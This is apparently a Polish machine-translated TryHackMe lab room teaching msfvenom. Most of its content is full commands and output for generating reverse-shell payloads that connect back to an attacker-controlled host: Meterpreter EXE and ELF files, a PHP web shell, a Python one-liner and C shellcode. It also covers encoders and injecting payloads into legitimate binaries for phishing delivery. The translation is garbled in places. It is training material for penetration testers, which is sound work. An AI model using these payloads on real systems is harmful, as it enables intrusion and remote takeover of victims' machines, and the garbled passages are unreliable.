---

W ciągu pierwszych trzech pomieszczeń tego modułu każdy użyty przez Ciebie ładunek został dostarczony za pomocą exploita uruchomionego z `msfconsole`. Wybrałeś moduł, ustawiłeś `RHOSTS`, `LHOST`wpisałeś `exploit`, a Metasploit zajął się resztą: spakowaniem ładunku, wysłaniem go do celu i nawiązaniem sesji.

Co się jednak stanie, gdy ten obieg pracy nie będzie miał zastosowania?

Rozważ kilka scenariuszy z interwencji Stratford Systems. Znalazłeś lukę w zabezpieczeniach umożliwiającą przesyłanie plików w aplikacji internetowej, ale nie ma modułu exploita Metasploit, który by ją obsługiwał. Masz uprawnienia SSH do serwera Linux i możesz przesyłać pliki, ale potrzebujesz sesji Meterpretera zamiast podstawowej powłoki. Musisz osadzić ładunek w istniejącym pliku wykonywalnym systemu Windows, aby dostarczyć go za pośrednictwem wiadomości phishingowej. W każdym z tych przypadków potrzebujesz **samodzielnego pliku ładunku** , który generujesz _poza_ modułem exploita i dostarczasz do celu za pomocą własnych środków.

To jest to, co `msfvenom`robi.

## Czym jest Msfvenom?

**Msfvenom** to narzędzie wiersza poleceń, które generuje ładunki w szerokiej gamie formatów dla praktycznie każdej platformy docelowej. Jest częścią Metasploit Framework, ale działa niezależnie od `msfconsole`. Używa się go ze zwykłego wiersza poleceń terminala, a nie z `msf6 >`wiersza poleceń.

Dzięki `msfvenom`możesz:

- Generuj samodzielne pliki wykonywalne ( `.exe`, `.elf`, `.apk`, `.war`), które dostarczają sesję Meterpretera lub powłokę poleceń po uruchomieniu na komputerze docelowym
- Twórz surowy kod powłoki w językach takich jak C, Python, PowerShell lub C# do osadzania we własnych narzędziach
- Tworzenie powłok internetowych (PHP, ASP, JSP) do przesyłania przez luki w zabezpieczeniach aplikacji internetowych
- Koduj ładunki, aby usunąć nieprawidłowe znaki lub przekształcić ich wzorce bajtów
- Wstrzykiwać ładunki do istniejących legalnych plików binarnych, aby wydawały się mniej podejrzane

## Historia: Dwa narzędzia stały się jednym

Starsze wersje Metasploit Framework dzieliły generowanie ładunku na dwa oddzielne narzędzia:

- **msfpayload** : Wygenerowano surowy wynik ładunku
- **msfencode** : Zakodowany ładunek wyjściowy służący do usuwania nieprawidłowych znaków lub próby podstawowego unikania

W 2015 roku oba narzędzia zostały połączone w jedno narzędzie: `msfvenom`. Jeśli natrafisz na starsze samouczki odwołujące się `msfpayload`do `msfencode`, te polecenia już nie istnieją. Wszystko, co one robiły, jest teraz obsługiwane przez `msfvenom`.

## Gdzie Msfvenom wpisuje się w przepływ pracy

Przepływ pracy testów penetracyjnych z wykorzystaniem msfvenom dodaje ręczny krok dostarczania, który `msfconsole`automatycznie obsługuje eksploit:

1. **Wygeneruj** ładunek `msfvenom`(określając platformę docelową, typ ładunku, format i szczegóły połączenia)
2. **Dostarcz** ładunek do celu (poprzez przesłanie pliku, transfer SSH, phishing, przechwycenie przez USB lub za pomocą dowolnego innego mechanizmu dostarczania)
3. **Skonfiguruj obsługę** , która będzie `msfconsole`używana `exploit/multi/handler`do przechwytywania połączenia przychodzącego
4. **Wykonaj** ładunek na celu (lub poczekaj, aż ofiara go wykona)
5. **Wejdź w interakcję** z powstałą sesją

Kroki od 3 do 5 są identyczne, jak w przypadku uruchomienia exploita z `msfconsole`. Różnica polega na tym, że za kroki 1 i 2 odpowiadasz _Ty_ , a nie moduł exploita, który wykonuje je za Ciebie.

## Wymagania wstępne

Ta sala stanowi kontynuację wszystkich trzech poprzednich sal w tym module. Powinieneś czuć się komfortowo z:

- [Metasploit: podstawy](https://tryhackme.com/room/metasploitthebasics)
- [Metasploit: skanowanie i eksploatacja](https://tryhackme.com/room/metasploitscanningandexploitation)
- [Metasploit: Post-eksploatacja](https://tryhackme.com/room/metasploitpostexploitation)

## Cele edukacyjne

Pod koniec tego pokoju będziesz w stanie:

- Służy `msfvenom`do generowania ładunków dla systemów Windows, Linux i aplikacji internetowych
- Wybierz pomiędzy ładunkami etapowymi i bezetapowymi w zależności od wymagań zaangażowania
- Wybierz odpowiedni format wyjściowy dla swojej metody dostarczania
- Zrozum, co kodowanie robi (a czego nie robi) w celu uniknięcia
- Wstrzykiwanie ładunków do istniejących plików binarnych
- Skonfiguruj `multi/handler`, aby przechwytywać połączenia odwrotne z samodzielnych ładunków
- Wykonaj pełny proces generowania → dostarczania → przechwytywania → poeksploatacyjnego

Zanim wygenerujemy jakiekolwiek ładunki, zapoznajmy się ze strukturą poleceń. Każde `msfvenom`polecenie działa według tego samego schematu, a po zapoznaniu się z flagami rdzenia, można zbudować dowolny ładunek obsługiwany przez framework.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Zadania 2-7 mają głównie charakter teoretyczny. Zdobytą w nich wiedzę zastosujesz w wyzwaniu na końcu. 

## Główna struktura dowodzenia

Minimalne `msfvenom`polecenie wymaga trzech rzeczy: ładunku ( `-p`), formatu ( `-f`) i parametrów połączenia ( `LHOST`/ `LPORT`w przypadku ładunków odwrotnych):

```
msfvenom -p <payload> LHOST=<your_ip> LPORT=<your_port> -f <format> -o <output_file>
```

Rozważmy konkretny przykład. Aby wygenerować odwrotną powłokę Meterpretera systemu Windows jako plik wykonywalny:

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Przyjrzyjmy się temu bliżej, flaga po fladze:

- **`-p windows/x64/meterpreter/reverse_tcp`**: Ładunek do wygenerowania. Używa tej samej konwencji nazewnictwa, której nauczyłeś się w sali 1: `platform/architecture/payload_type/connection_method`.
- **`LHOST=10.10.14.12`**: Adres IP atakującego komputera. Cel połączy się z tym adresem po uruchomieniu ładunku.
- **`LPORT=4444`**:Port na Twoim komputerze, który będzie odbierał połączenie.
- **`-f exe`**:Format wyjściowy. W tym przypadku przenośny plik wykonywalny systemu Windows.
- **`-o shell.exe`**: Nazwa pliku wyjściowego. Bez `-o`, `msfvenom`surowa zawartość jest drukowana na standardowym wyjściu, co jest przydatne do przesyłania danych do innych narzędzi, ale nie do zapisywania pliku binarnego.

### Kompletny opis flagi

Oto wszystkie flagi, których będziesz regularnie używać:

|Flaga|Zamiar|Przykład|
|---|---|---|
|`-p`|Wybierz ładunek|`-p linux/x64/meterpreter/reverse_tcp`|
|`-f`|Ustaw format wyjściowy|`-f elf`, `-f exe`, `-f raw`,`-f python`|
|`-o`|Zapisz dane wyjściowe do pliku|`-o payload.exe`|
|`-e`|Wybierz enkoder|`-e x86/shikata_ga_nai`|
|`-i`|Liczba iteracji kodowania|`-i 5`|
|`-b`|Postacie, których należy unikać (złe postacie)|`-b '\x00\x0a\x0d'`|
|`-x`|Szablon binarny (wstrzykuje ładunek do istniejącego pliku)|`-x putty.exe`|
|`-k`|Zachowaj oryginalne zachowanie szablonu|`-k`(używane z `-x`)|
|`-a`|Nadpisz architekturę|`-a x64`|
|`--platform`|Platforma nadrzędna|`--platform windows`|
|`-n`|Dodaj na początku sanki NOP o długości N bajtów|`-n 16`|
|`LHOST=`|Twój adres IP słuchacza (nie flaga, a opcja ładunku)|`LHOST=10.10.14.12`|
|`LPORT=`|Twój port nasłuchujący (nie flaga, a opcja ładunku)|`LPORT=4444`|

Należy pamiętać, że `LHOST`i `LPORT`nie są flagami msfvenom (nie używają `-`prefiksu). Są to **opcje ładunku** , przekazywane bezpośrednio `KEY=VALUE`parami po `-p`fladze. Różne ładunki mogą mieć różne opcje; można sprawdzić, czego wymaga konkretny ładunek za pomocą `msfvenom -p <payload> --list-options`.

## Wypisywanie dostępnych produktów

Msfvenom potrafi wyświetlić listę wszystkich obsługiwanych ładunków, koderów, formatów, platform i architektur. `-l`Flaga (małe L) to narzędzie do wyszukiwania:

**Wypisz wszystkie ładunki:**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -l payloads

Framework Payloads (1710 total)
===============================

 Name                                                Description
 ----                                                -----------
 aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
 android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
 android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
 [...]
 windows/x64/meterpreter/reverse_tcp                 Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager
 windows/x64/meterpreter_reverse_tcp                 Windows Meterpreter Shell, Reverse TCP Inline
 windows/x64/shell/reverse_tcp                       Windows x64 Command Shell, Reverse TCP Stager
 [...]
```

Dane wyjściowe są długie (~1700 ładunków). Prawie zawsze będziesz chciał je przesłać `grep`do filtra:

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -l payloads | grep linux | grep meterpreter
 linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
 linux/aarch64/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
 linux/x64/meterpreter/reverse_tcp                    Inject the mettle server payload (staged). Connect back to the attacker
 linux/x64/meterpreter_reverse_tcp                    Run the Meterpreter / Mettle server payload (stageless)
 linux/x86/meterpreter/reverse_tcp                    Inject the mettle server payload (staged). Connect back to the attacker
 [...]
```

**Wyświetl formaty wyjściowe:**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -l formats

Framework Executable Formats [--format <value>]
===============================================

 Name
 ----
 asp
 aspx
 dll
 elf
 exe
 macho
 msi
 [...]

Framework Transform Formats [--format <value>]
==============================================

 Name
 ----
 base64
 c
 csharp
 hex
 java
 powershell
 python
 raw
 [...]
```

Zwróć uwagę, że formaty dzielą się na dwie kategorie: **formaty wykonywalne** generują samodzielne pliki binarne oraz **formaty transformacyjne** generujące kod lub dane, które można osadzić w innym mechanizmie dostarczania. Omówimy to rozróżnienie w Zadaniu 4.

**Lista enkoderów:**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -l encoders

Framework Encoders [--encoder <value>]
======================================

 Name                          Rank       Description
 ----                          ----       -----------
 cmd/brace                     low        Bash Brace Expansion Command Encoder
 cmd/echo                      good       Echo Command Encoder
 generic/eicar                 manual     The EICAR Encoder
 generic/none                  normal     The "none" Encoder
 php/base64                    great      PHP Base64 Encoder
 x64/xor                      normal     XOR Encoder
 x64/xor_dynamic              normal     Dynamic key XOR Encoder
 x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
 [...]
```

**Wymień platformy i architektury:**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -l platforms
[...]
android, apple_ios, bsd, java, linux, osx, php, python, unix, windows [...]

root@CONNECTION_IP:~# msfvenom -l archs
[...]
aarch64, armbe, armle, cmd, java, mipsbe, mipsle, php, ppc, python, sparc, x64, x86 [...]
```

## Sprawdzanie opcji ładunku

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options

Options for payload/windows/x64/meterpreter/reverse_tcp:
=========================

 Name: Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager
 Module: payload/windows/x64/meterpreter/reverse_tcp
 Platform: Windows
 Arch: x64

Basic options:
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
 LHOST                      yes       The listen address (an interface may be specified)
 LPORT     4444             yes       The listen port

Description:
 Inject the mettle server payload (staged). Connect back to the attacker
```

Wyjście to odzwierciedla `show options`wyświetlacz, który znasz z `msfconsole`.

W sali 1 przedstawiliśmy koncepcję ładunków etapowych i bezetapowych oraz pokazaliśmy, jak je rozróżnić po separatorze w ich nazwach ( `/`dla „etapowych”, `_`dla „bezetapowych”). W tym zadaniu zagłębimy się w temat: jakie są praktyczne kompromisy, kiedy należy wybrać każdy typ i jak generować oba za pomocą `msfvenom`?

## Podsumowanie: Jak działa każdy typ

**Ładunki bezstopniowe (inline)** są autonomiczne. Cały ładunek, w tym agent Meterpretera lub kod powłoki, jest spakowany w pojedynczy plik. Po uruchomieniu ładunku na obiekcie docelowym, łączy się on z programem obsługi, a sesja jest nawiązywana w jednym kroku.

**Ładunki etapowe** działają w dwóch krokach. Najpierw na celu wykonywany jest mały **etap** . Jego jedynym zadaniem jest nawiązanie połączenia sieciowego z programem obsługi. Po nawiązaniu połączenia, program obsługi wysyła przez to połączenie większy **etap** (pełny ładunek Meterpretera lub powłoki). Etap jest ładowany do pamięci i uruchamiany.

## Kompromisy

|Czynnik|Bez sceny|Wystawiany na scenie|
|---|---|---|
|**Rozmiar pliku**|Większy (z pełnym ładunkiem)|Mniejszy (w pliku znajduje się tylko stager)|
|**Niezawodność**|Większa niezawodność; nie ma drugiego pobrania, które mogłoby się nie powieść|Zależy od stabilnego połączenia podczas transferu etapu|
|**Zależność sieciowa**|Łączy się raz|Do pobrania etapu wymagane jest stałe połączenie|
|**Powierzchnia detekcji**|Pełny ładunek na dysku (łatwiejsze dopasowanie podpisu)|Mniejszy plik początkowy (trudniejszy do dopasowania podpisu), ale możliwe jest wykrycie transferu etapowego|
|**Zachowanie zapory sieciowej**|Pojedyncze połączenie wychodzące|Stager łączy się, a następnie pobiera dużą ilość danych (etap); niektóre systemy IDS mogą oznaczać ten wzorzec|
|**Użyj z exploitami msfconsole**|Działa, ale jest mniej powszechne jako domyślne|Domyślne dla większości modułów exploitów msfconsole|
|**Użyj z msfvenom**|Popularny wybór dla samodzielnych ładunków|Działa, ale wymaga od osoby obsługującej scenę|

## Kiedy wybrać każdy

**Wybierz opcję bezstopniową, gdy:**

- Generujesz samodzielny plik do `msfvenom`ręcznego dostarczenia (przesyłanie przez USB, przesyłanie plików, transfer SSH). Ładunek musi być autonomiczny, ponieważ nie możesz kontrolować warunków sieciowych podczas wykonywania.
- Masz na myśli środowisko z przerywaną lub zawodną łącznością sieciową. Ładunek bezstopniowy musi połączyć się tylko raz.
- Chcesz prostoty. Nie jest wymagana żadna koordynacja między stagerem a sceną; albo działa, albo nie.

**Wybierz opcję „etapowo”, gdy:**

- Pracujesz w `msfconsole`module exploitów, który automatycznie zajmuje się przygotowaniem (jest to domyślne zachowanie w przypadku większości exploitów).
- Należy zminimalizować początkowy rozmiar ładunku, na przykład w przypadku wykorzystania przepełnienia bufora przy ścisłym ograniczeniu rozmiaru.
- Przesyłasz ładunek przez kanał z ograniczeniami rozmiaru (np. atak SQL injection, który może wstrzyknąć tylko niewielką ilość kodu powłoki).

W praktyce większość `msfvenom`generowanych autonomicznych ładunków korzysta z wariantów **bezetapowych** , ponieważ niezawodność i samowystarczalność przeważają nad względami rozmiaru. Większość `msfconsole`exploitów korzysta z wariantów **etapowych** , ponieważ moduł exploita automatycznie zarządza procesem etapowania.

## Generowanie obu za pomocą Msfvenom

Wygenerujmy tę samą powłokę odwrotną Meterpretera w obu formach i porównajmy ją.

**Wystawiany na scenie:**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o staged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: staged.exe
```

**Bezstopniowy:**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o stageless.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201798 bytes
Final size of exe file: 250880 bytes
Saved as: stageless.exe
```

Różnice są uderzające:

- **Rozmiar ładunku etapowego** : 510 bajtów (7 KB jako plik EXE). To tylko etap przygotowawczy; pełny agent Meterpretera zostanie pobrany później.
- **Rozmiar ładunku bezstopniowego** : 201 798 bajtów (245 KB jako plik EXE). To kompletny agent Meterpretera, gotowy do uruchomienia bez konieczności dodatkowego pobierania.

Jedyną rzeczą, która uległa zmianie w poleceniu, była nazwa ładunku: `meterpreter/reverse_tcp`(staged, with `/`) lub `meterpreter_reverse_tcp`(stageless, with `_`). Wszystkie pozostałe flagi pozostały niezmienione.

## Różnice w zachowaniu opiekunów

Podczas przechwytywania ładunku etapowego za pomocą `exploit/multi/handler`, handler musi przekazać etap do łączącego się stagera. Jeśli handler nie jest uruchomiony podczas wykonywania stagera lub jeśli typ ładunku w handlerze nie jest dokładnie taki sam, połączenie zostanie przerwane bez powiadomienia.

Podczas przechwytywania ładunku bezstopniowego, moduł obsługi po prostu odbiera już ukończone połączenie z Meterpreterem. Nie ma etapu do obsłużenia. Dzięki temu ładunki bezstopniowe są nieco bardziej odporne na problemy z synchronizacją.

W obu przypadkach konfiguracja modułu obsługi musi dokładnie odpowiadać parametrom `LHOST`, `LPORT`, oraz typowi ładunku. Moduły obsługi skonfigurujemy w zadaniu 7.

Rozumiesz składnię, flagi oraz rozróżnienie między przetwarzaniem etapowym a bezetapowym. Teraz wygenerujemy rzeczywiste ładunki dla platform i scenariuszy, z którymi będziesz się najczęściej spotykać. Po drodze omówimy dwie kategorie formatów wyjściowych i dowiemy się, kiedy używać każdego z nich.

## Formaty wykonywalne a formaty transformacji

Po uruchomieniu `msfvenom -l formats`, dane wyjściowe są dzielone na dwie sekcje. Zrozumienie różnicy między nimi jest kluczowe dla wyboru właściwej `-f`flagi.

**Formaty wykonywalne** generują samodzielne pliki binarne, które system operacyjny docelowy może uruchomić bezpośrednio. Należą do nich `exe`: (Windows), `elf`(Linux), `macho`(macOS), `msi`(Instalator Windows), `apk`(Android) i `war`(aplikacje internetowe Java). Używa się ich, gdy metoda dostarczania umieszcza na docelowym komputerze plik, który zostanie wykonany.

**Formaty transformacji** generują kod lub dane, które można osadzić w innym narzędziu, skrypcie lub exploicie. Należą do nich `raw`: (surowe bajty), `c`(tablica bajtów C), `csharp`(tablica bajtów C#), `python`(ciąg bajtów Pythona), `powershell`(PowerShellTablica bajtów), `hex`(ciąg szesnastkowy) i `base64`(zakodowanie Base64). Używa się ich podczas tworzenia własnego exploita, wstrzykiwania kodu powłoki do niestandardowego programu ładującego lub osadzania ładunku w skrypcie.

Zasada jest prosta: jeśli potrzebujesz _pliku, który uruchamia obiekt docelowy_ , użyj formatu wykonywalnego. Jeśli potrzebujesz _danych, które osadzasz w czymś innym_ , użyj formatu transformacji.

## Typowe przepisy na ładunki

Poniżej znajduje się pięć typów danych, które będziesz generować najczęściej. Każdy przykład zawiera pełne polecenie i wyjaśnienie, kiedy należy go użyć.

**1. Odwrotna powłoka systemu Windows (EXE)**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201798 bytes
Final size of exe file: 250880 bytes
Saved as: shell.exe
```

Kiedy używać: Masz możliwość umieszczenia pliku wykonywalnego na obiekcie docelowym Windows (przesyłanie plików, udział SMB, załącznik phishingowy, zrzut USB). Obiekt docelowy uruchamia plik `.exe`, a sesja Meterpretera łączy się z Twoim programem obsługi.

Zwróć uwagę na bezstopniowy ładunek ( `meterpreter_reverse_tcp`z `_`). W przypadku samodzielnych plików wykonywalnych, bezstopniowy ładunek jest standardowym wyborem zapewniającym niezawodność.

**2. Odwrotna powłoka Linux (ELF)**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1046528 bytes
Final size of elf file: 1046528 bytes
Saved as: shell.elf
```

Kiedy używać: Masz dostęp do przesyłania plików doLinuxCel (SSH, SCP, zapisywalny katalog internetowy lub luka w zabezpieczeniach przesyłania plików). Po przesłaniu pliku należy nadać mu uprawnienia wykonywalne, `chmod +x shell.elf`a następnie uruchomić go za pomocą `./shell.elf`.

Format **ELF (Executable and Linkable Format)** to odpowiednik systemu Windows w systemie Linux `.exe`. Jest to standardowy format binarny wLinux, macOS i większość systemów typu Unix.

**3. Powłoka internetowa PHP**

Pole ataku

```shell-session
root@CONNECTION_IP:~# msfvenom -p php/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f raw -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 34802 bytes
Saved as: shell.php
```

Kiedy stosować: Znalazłeś lukę w zabezpieczeniach umożliwiającą przesyłanie plików wPHPAplikacja internetowa oparta na technologii . Przesyłasz ją `shell.php`, a następnie uruchamiasz, przechodząc do jej adresu URL (np. `http://target.com/uploads/shell.php`).PHPśrodowisko wykonawcze na serwerze internetowym wykonuje ładunek i łączy się z powrotem z programem obsługi.

> **Ważne** : Po wygenerowaniuPHPŁadunek z `msfvenom`, otwórz plik i sprawdź, czy zaczyna się od poprawnego `<?php`znacznika otwierającego. Niektóre wersje programu `msfvenom`wyprowadzają znacznik otwierający jako komentarz ( `/*<?php /**/`). JeśliPHPSilnik nie rozpoznaje pliku jakoPHPW przypadku kodu ładunek nie zostanie wykonany. W razie potrzeby usuń znaczniki komentarza wokół znacznika otwierającego.

**4. Jednowierszowy Python**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p cmd/unix/reverse_python LHOST=CONNECTION_IP LPORT=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 505 bytes
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNv...')[0]))"
```

Kiedy używać: Na obiekcie docelowym jest zainstalowany Python, a Ty możesz wykonywać polecenia (poprzez lukę w zabezpieczeniach polegającą na wstrzykiwaniu poleceń, sesję SSH lub powłokę internetową). Wklejasz lub przesyłasz ten jeden wiersz bezpośrednio do terminala obiektu docelowego. Żaden plik nie musi mieć kontaktu z dyskiem.

Zwróć uwagę, że format wyjściowy to `raw`(nie `elf`lub `exe`) i nie ma żadnej `-o`flagi, a dane są drukowane bezpośrednio w terminalu. To **format transformacji** w działaniu: dane wyjściowe to kod, a nie plik binarny.

**5. Surowy kod powłoki (format C)**

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201798 bytes
Final size of c file: 853830 bytes
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50"
[...]
```

Kiedy używać: Piszesz niestandardowy exploit, budujesz program ładujący dane w C lub potrzebujesz surowych bajtów kodu powłoki do osadzenia w exploicie przepełnienia bufora. Wynikiem jest tablica bajtów w stylu C, którą możesz skopiować bezpośrednio do kodu źródłowego.

Inne przydatne formaty transformacji podążają za tym samym schematem: `-f python`dla ciągu bajtów Pythona, `-f csharp`dla tablicy bajtów C#, `-f powershell`dla ciągu bajtów C#,PowerShell-format zgodny `-f hex`z formatem zwykłego ciągu szesnastkowego.

## Krótki przewodnik: Typowe formaty

|Scenariusz|Ładunek|Format|Przykładowa flaga|
|---|---|---|---|
|Plik wykonywalny systemu Windows do upuszczania plików|`windows/x64/meterpreter_reverse_tcp`|`exe`|`-f exe`|
|Plik wykonywalny systemu Linux do transferu SSH|`linux/x64/meterpreter_reverse_tcp`|`elf`|`-f elf`|
|Powłoka internetowa PHP do przesyłania plików|`php/meterpreter_reverse_tcp`|`raw`|`-f raw`|
|Wstrzykiwanie poleceń Pythona|`cmd/unix/reverse_python`|`raw`|`-f raw`|
|Kod powłoki dla niestandardowego exploita C|Dowolny ładunek Windows/Linux|`c`|`-f c`|
|Wykonywanie poleceń programu PowerShell dla systemu Windows|`windows/x64/meterpreter_reverse_tcp`|`powershell`|`-f powershell`|
|Aplikacja internetowa Java (Tomcat, Jenkins)|`java/meterpreter/reverse_tcp`|`war`|`-f war`|
|Instalator systemu Windows do dostawy|`windows/x64/meterpreter_reverse_tcp`|`msi`|`-f msi`|

Odpowiedz na poniższe pytania

Jakiego formatu wyjściowego użyłbyś do wygenerowania pliku wykonywalnego binarnego systemu Linux?

W kręgach początkujących testerów penetracyjnych panuje błędne przekonanie, że zakodowanie ładunku za pomocą kodu `msfvenom`obejdzie oprogramowanie antywirusowe. Zajmijmy się tym bezpośrednio: **kodowanie nie jest metodą unikania** . Zrozumienie, co kodowanie faktycznie robi, a czego nie, uchroni Cię przed błędnymi założeniami dotyczącymi rzeczywistych działań.

## Co właściwie robi kodowanie

Koder przekształca sekwencję bajtów ładunku na inną reprezentację. Najbardziej znanym koderem w Metasploit jest **,**`x86/shikata_ga_nai` który stosuje polimorficzne kodowanie XOR z addytywnym sprzężeniem zwrotnym. Mówiąc prościej, szyfruje on ładunek za pomocą XOR zmiennym kluczem i dodaje mały szczątkowy dekoder. Podczas wykonywania ładunku, szczątkowy dekoder uruchamia się jako pierwszy, dekoduje ładunek z powrotem do jego pierwotnej postaci w pamięci, a następnie przekazuje wykonywanie do zdekodowanego ładunku.

Podstawowe uzasadnione przypadki użycia kodowania to:

- **Usuwanie złych znaków** : Niektóre kanały dystrybucji exploitów nie tolerują określonych wartości bajtów. Na przykład, przepełnienie bufora wykorzystane za pomocą funkcji kopiowania ciągu znaków może zostać przerwane, jeśli ładunek zawiera bajty zerowe ( `\x00`), znaki nowej linii ( `\x0a`) lub znaki powrotu karetki ( `\x0d`). Kodowanie przekształca ładunek, dzięki czemu te bajty nigdy się nie pojawiają.
- **Zgodność z formatem** : Niektóre kanały dystrybucji mają ograniczenia dotyczące zestawu znaków (np. tylko drukowalny ASCII). Kodowanie może zapewnić, że ładunek będzie mieścił się w tych ograniczeniach.

## Korzystanie z enkoderów z Msfvenom

Flaga `-e`wybiera koder, `-i`ustawia liczbę iteracji kodowania i `-b`określa nieprawidłowe znaki, których należy unikać:

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -o encoded.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 201830 (iteration=0)
x86/shikata_ga_nai succeeded with size 201862 (iteration=1)
x86/shikata_ga_nai succeeded with size 201894 (iteration=2)
x86/shikata_ga_nai chosen with final size 201894
Payload size: 201894 bytes
Final size of exe file: 250880 bytes
Saved as: encoded.exe
```

Każda iteracja ponownie koduje dane wyjściowe z poprzedniej iteracji, nieznacznie zwiększając rozmiar danych. Po trzech iteracjach rozmiar danych wzrósł z 201 798 bajtów do 201 894 bajtów.

Aby uniknąć określonych złych znaków, należy użyć `-b`następujących znaków w notacji szesnastkowej:

Terminal AttackBox

```shell-session
root@CONNECTION_IP:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f c -b '\x00\x0a\x0d'
```

Po podaniu parametru `-b`, msfvenom automatycznie wybiera odpowiedni koder, aby wyeliminować te bajty z danych wyjściowych. Nie ma konieczności `-e`oddzielnego określania parametru podczas korzystania z `-b`; msfvenom wybierze koder, który obsłuży nieprawidłowy zestaw znaków.

## Weryfikacja rzeczywistości: dlaczego kodowanie nie omija nowoczesnych systemów AV

Na początku XXI wieku rozwiązania antywirusowe opierały się niemal wyłącznie na **statycznym dopasowywaniu sygnatur** : porównywaniu plików bajt po bajcie z bazą danych znanych wzorców złośliwego oprogramowania. Kodowanie pozwalało obejść ten problem poprzez zmianę wzorca bajtów, a narzędzia takie jak [brakuje kontekstu - prawdopodobnie błąd w oryginale] `shikata_ga_nai`były skuteczne, ponieważ polimorficzny wynik wyglądał inaczej w każdej generacji.

Nowoczesne zabezpieczenia punktów końcowych wykroczyły daleko poza statyczne podpisy:

- **Analiza heurystyczna** bada, _co kod robi_ , a nie tylko jak wygląda. Zastępczy dekoder, który odszyfrowuje i wykonuje dowolny kod w pamięci, to dobrze znany wzorzec zachowania.
- **Sandboxing** uruchamia podejrzane pliki w odizolowanym środowisku i obserwuje ich zachowanie. Ładunek dekoduje się i działa normalnie w sandboxie, ujawniając jego prawdziwe przeznaczenie.
- **AMSI (Antimalware Scan Interface)** w systemie Windows przechwytuje skrypty i ładunki w czasie wykonywania, sprawdzając je _po_ zdekodowaniu, ale _przed_ wykonaniem.
- **Modele uczenia maszynowego** trenowane na milionach próbek potrafią identyfikować złośliwe wzorce nawet w kodzie polimorficznym.

